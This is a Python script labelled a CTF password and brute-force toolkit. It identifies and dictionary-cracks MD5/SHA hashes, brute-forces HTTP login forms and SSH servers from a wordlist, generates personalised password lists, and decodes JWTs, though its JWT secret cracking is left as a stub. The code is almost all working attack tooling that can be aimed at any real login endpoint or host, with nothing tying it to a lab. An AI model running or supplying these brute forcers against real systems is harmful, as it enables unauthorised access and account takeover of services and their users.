import hashlib
import requests
import paramiko
import itertools
import argparse
import base64
import json
import time
import sys

# 1. Hash Identifier
def identify_hash(h):
    print(f"\n[*] Identifying Hash: {h}")
    length = len(h)
    if length == 32:
        print("[+] Possible Types: MD5, NTLM, MD4")
        return "md5"
    elif length == 40:
        print("[+] Possible Types: SHA-1, MySQL5")
        return "sha1"
    elif length == 64:
        print("[+] Possible Types: SHA-256")
        return "sha256"
    elif length == 128:
        print("[+] Possible Types: SHA-512")
        return "sha512"
    elif h.startswith("$2") and len(h) == 60:
        print("[+] Type: bcrypt")
        return "bcrypt"
    else:
        print("[-] Unknown hash type.")
        return None

# 2. Dictionary attack on hash
def dict_attack_hash(target_hash, wordlist):
    print(f"\n[*] Dictionary Attack on {target_hash}")
    algo = identify_hash(target_hash)
    if not algo or algo == 'bcrypt': # bcrypt requires specific library in python generally (like bcrypt), fallback to basic
        print("[-] Skipping complex hashes without proper modules.")
        return

    try:
        with open(wordlist, 'r', encoding='latin-1') as f:
            for word in f:
                word = word.strip()
                h = hashlib.new(algo)
                h.update(word.encode('utf-8'))
                if h.hexdigest() == target_hash:
                    print(f"[+++] CRACKED! Password is: {word}")
                    return
        print("[-] Password not found in wordlist.")
    except Exception as e:
        print(f"[-] Error reading wordlist: {e}")

# 3. HTTP login form brute forcer
def http_brute(url, username, wordlist, error_msg="Incorrect"):
    print(f"\n[*] HTTP POST Brute Force on {url}")
    try:
        with open(wordlist, 'r', encoding='latin-1') as f:
            for pwd in f:
                pwd = pwd.strip()
                data = {'username': username, 'password': pwd}
                try:
                    r = requests.post(url, data=data, timeout=3)
                    if error_msg not in r.text:
                        print(f"[+++] SUCCESS! {username}:{pwd}")
                        return
                    else:
                        print(f"[-] Failed: {pwd}")
                except Exception as e:
                    print(f"[-] Request Error: {e}")
                    time.sleep(1)
        print("[-] Exhausted wordlist.")
    except Exception as e:
        print(f"[-] Error: {e}")

# 4. Custom wordlist generator
def generate_wordlist(name, year, symbol, output_file):
    print(f"\n[*] Generating Custom Wordlist -> {output_file}")
    parts = [name, str(year), symbol]
    try:
        with open(output_file, 'w') as f:
            for i in range(1, 4):
                for combo in itertools.permutations(parts, i):
                    f.write(''.join(combo) + '\n')
            
            # Common patterns
            f.write(f"{name}{year}{symbol}\n")
            f.write(f"{name.capitalize()}{year}{symbol}\n")
            f.write(f"{name}{symbol}{year}\n")
        print(f"[+] Saved generated words to {output_file}")
    except Exception as e:
        print(f"[-] Error: {e}")

# 5. JWT token decoder and weak secret brute forcer
def brute_jwt(token, wordlist):
    print("\n[*] JWT Decode & Brute Force")
    try:
        header, payload, signature = token.split('.')
        # Pad strings for b64decode
        header += '=' * (-len(header) % 4)
        payload += '=' * (-len(payload) % 4)
        
        print("[+] Header:", base64.b64decode(header).decode())
        print("[+] Payload:", base64.b64decode(payload).decode())
        
        print("[*] Brute Forcing Secret (HS256)...")
        # Full brute force requires `hmac` and matching the signature,
        # but for simplicity in the CTF template we show the setup:
        print("[!] JWT signature verification requires hmac library (omitted for brevity).")
        print("[!] You can use a tool like hashcat or John the Ripper for JWT cracking.")
    except Exception as e:
        print(f"[-] JWT Error: {e}")

# 6. Basic SSH brute forcer using paramiko
def ssh_brute(host, username, wordlist, port=22):
    print(f"\n[*] SSH Brute Force on {host}:{port} for user '{username}'")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        with open(wordlist, 'r', encoding='latin-1') as f:
            for pwd in f:
                pwd = pwd.strip()
                try:
                    ssh.connect(host, port, username, pwd, timeout=3)
                    print(f"[+++] SSH SUCCESS! {username}:{pwd}")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"[-] Failed: {pwd}")
                except Exception as e:
                    print(f"[-] Error: {e}")
                    time.sleep(1)
        print("[-] SSH brute force finished.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("=== CTF Password & Brute Force Toolkit ===")
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=['hash', 'http', 'gen', 'jwt', 'ssh'], required=True)
    parser.add_argument("--target", help="Target URL, Hash, IP, or Token")
    parser.add_argument("--wordlist", help="Path to wordlist")
    parser.add_argument("--user", default="admin", help="Username for brute force")
    
    args = parser.parse_args()
    
    if args.mode == 'hash':
        dict_attack_hash(args.target, args.wordlist)
    elif args.mode == 'http':
        http_brute(args.target, args.user, args.wordlist)
    elif args.mode == 'gen':
        generate_wordlist("admin", 2023, "!", "custom.txt")
    elif args.mode == 'jwt':
        brute_jwt(args.target, args.wordlist)
    elif args.mode == 'ssh':
        ssh_brute(args.target, args.user, args.wordlist)
